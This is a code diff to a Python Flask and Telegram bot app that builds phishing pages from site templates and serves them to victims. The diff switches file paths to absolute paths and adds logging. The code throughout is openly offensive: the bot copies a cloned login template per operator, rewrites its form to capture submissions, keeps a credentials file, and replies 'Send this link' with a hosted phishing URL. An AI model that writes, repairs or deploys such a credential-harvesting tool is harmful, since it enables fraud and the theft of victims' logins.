@@ -43,14 +43,15 @@ TEMPLATES_DIR = "Templates"
 # Function to get all available templates
 def get_available_templates():
     templates = []
-    # Look for all directories in the Templates folder
-    if os.path.exists(TEMPLATES_DIR):
-        template_dirs = [d for d in os.listdir(TEMPLATES_DIR)
-                         if os.path.isdir(os.path.join(TEMPLATES_DIR, d))]
+    # Look for all directories in the Templates folder using absolute path
+    templates_dir = os.path.join(os.path.abspath(os.path.dirname(__file__)), TEMPLATES_DIR)
+    if os.path.exists(templates_dir):
+        template_dirs = [d for d in os.listdir(templates_dir)
+                         if os.path.isdir(os.path.join(templates_dir, d))]
 
         for template in template_dirs:
             # Check if the template has an index.html file
-            if os.path.exists(os.path.join(TEMPLATES_DIR, template, "index.html")):
+            if os.path.exists(os.path.join(templates_dir, template, "index.html")):
                 templates.append(template)
 
     return templates
@@ -77,16 +78,23 @@ def status():
 # Route to serve static files (CSS, JS, images)
 @app.route('/phish/<user_id>/<path:filename>')
 def serve_static(user_id, filename):
-    folder = f"phished_pages/{user_id}"
+    base_dir = os.path.abspath(os.path.dirname(__file__))
+    folder = os.path.join(base_dir, "phished_pages", user_id)
     return send_from_directory(folder, filename)
 
 
 # Route to serve the phishing page to victims
 @app.route('/phish/<user_id>', methods=['GET'])
 def serve_phish_page(user_id):
-    folder = f"phished_pages/{user_id}"
-    if os.path.exists(f"{folder}/index.html"):
+    base_dir = os.path.abspath(os.path.dirname(__file__))
+    folder = os.path.join(base_dir, "phished_pages", user_id)
+    logger.info(f"Attempting to serve page from folder: {folder}")
+    logger.info(f"Current working directory: {os.getcwd()}")
+    
+    if os.path.exists(os.path.join(folder, "index.html")):
+        logger.info("Found index.html file")
         return send_from_directory(folder, "index.html")
+    logger.error(f"Page not found in folder: {folder}")
     return "Page not found", 404
 
 
@@ -229,9 +237,10 @@ def handle_template_selection(message):
     user_id = str(message.chat.id)
     bot.send_message(message.chat.id, f"⚙️ Generating phishing page for {template}...")
 
-    # Locate template and create output directory
-    template_path = f"{TEMPLATES_DIR}/{template}/index.html"
-    output_path = f"phished_pages/{user_id}"
+    # Get absolute paths
+    base_dir = os.path.abspath(os.path.dirname(__file__))
+    template_path = os.path.join(base_dir, TEMPLATES_DIR, template, "index.html")
+    output_path = os.path.join(base_dir, "phished_pages", user_id)
 
     # Remove existing files if any
     if os.path.exists(output_path):
@@ -246,7 +255,7 @@ def handle_template_selection(message):
     if os.path.exists(template_path):
         try:
             # Copy all files from template directory to output directory
-            template_dir = f"{TEMPLATES_DIR}/{template}"
+            template_dir = os.path.join(base_dir, TEMPLATES_DIR, template)
             for item in os.listdir(template_dir):
                 src = os.path.join(template_dir, item)
                 dst = os.path.join(output_path, item)
@@ -256,16 +265,18 @@ def handle_template_selection(message):
                     shutil.copytree(src, dst, dirs_exist_ok=True)
 
             # Add template info for tracking
-            with open(f"{output_path}/template_info.txt", 'w') as f:
+            with open(os.path.join(output_path, "template_info.txt"), 'w') as f:
                 f.write(template)
 
             # Prepare the phishing page with the user_id
-            if prepare_phishing_page(f"{output_path}/index.html", f"{output_path}/index.html", user_id, template):
+            output_html = os.path.join(output_path, "index.html")
+            if prepare_phishing_page(output_html, output_html, user_id, template):
                 phishing_url = f"https://notafish-1.onrender.com/phish/{user_id}"
                 bot.send_message(message.chat.id, f"✅ Done!\nSend this link:\n{phishing_url}")
             else:
                 bot.send_message(message.chat.id, "❌ Failed to prepare phishing page.")
         except Exception as e:
+            logger.error(f"Error in template selection: {e}")
             bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
     else:
         bot.send_message(message.chat.id, f"❌ Template '{template}' not found.")
@@ -274,6 +285,9 @@ def handle_template_selection(message):
 # Updated function to modify HTML file to keep the form method and add user_id to action
 def prepare_phishing_page(template_path, output_path, user_id, template_name):
     try:
+        logger.info(f"Preparing phishing page. Template path: {template_path}")
+        logger.info(f"Output path: {output_path}")
+        
         # Read the template HTML
         with open(template_path, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
@@ -322,16 +336,22 @@ def run_bot_with_error_handling():
 
 # Main entry point
 if __name__ == '__main__':
+    # Get the absolute base path
+    BASE_DIR = os.path.abspath(os.path.dirname(__file__))
+    
     # Initialize credentials file
     initialize_creds_file()
 
-    # Create directories if they don't exist
-    os.makedirs("phished_pages", exist_ok=True)
-    os.makedirs(TEMPLATES_DIR, exist_ok=True)
+    # Create directories if they don't exist with absolute paths
+    os.makedirs(os.path.join(BASE_DIR, "phished_pages"), exist_ok=True)
+    os.makedirs(os.path.join(BASE_DIR, TEMPLATES_DIR), exist_ok=True)
 
     # List available templates on startup
     templates = get_available_templates()
     logger.info(f"Available templates: {templates}")
+    logger.info(f"Base directory: {BASE_DIR}")
+    logger.info(f"Templates directory: {os.path.join(BASE_DIR, TEMPLATES_DIR)}")
+    logger.info(f"Phished pages directory: {os.path.join(BASE_DIR, 'phished_pages')}")
 
     # Try to stop any existing bot instances
     try:
